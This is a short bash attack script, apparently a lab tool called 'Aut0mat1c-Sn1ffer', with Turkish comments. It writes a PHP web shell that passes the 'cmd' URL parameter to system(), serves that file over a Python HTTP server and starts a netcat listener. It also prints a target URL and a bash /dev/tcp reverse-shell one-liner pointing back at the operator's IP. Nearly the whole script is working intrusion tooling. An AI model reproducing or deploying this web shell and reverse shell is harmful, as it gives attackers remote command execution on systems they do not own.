#!/bin/bash

# Banner
clear
echo -e "\e[1;31m--| Created By UMIT SAMET TASCI |--\e[0m"
echo -e "\e[1;34m-------| Aut0mat1c-Sn1ffer |-------\e[0m"
sleep 1

# 1. Dizin Hazırlığı
TARGET_DIR="$HOME/Desktop/X"
mkdir -p "$TARGET_DIR"
cd "$TARGET_DIR" || exit

# 2. PHP Web Shell Oluşturma (OTOMATİK)
# Bu kısım klasörün içine kabuk.php dosyasını kendi yazar.
cat <<EOF > kabuk.php
<?php
if(isset(\$_GET['cmd'])) {
    system(\$_GET['cmd']);
} else {
    echo "Aut0mat1c-Sn1ffer is active. Usage: ?cmd=[command]";
}
?>
EOF

echo "[+] kabuk.php created in $TARGET_DIR"

# 3. Servisleri Başlat
MY_IP=$(hostname -I | awk '{print $1}')

# HTTP Server
xterm -T "Payload Server" -geometry 80x20+0+0 -hold -e "python3 -m http.server 8080" &

# Netcat Listener
xterm -T "NC Listener" -geometry 80x20+500+0 -hold -e \
"echo 'Target URL: http://ninja.testlab.local/kabuk.php?cmd=id'; \
echo 'Reverse Shell: bash -i >& /dev/tcp/$MY_IP/9999 0>&1'; \
nc -lvp 9999" &
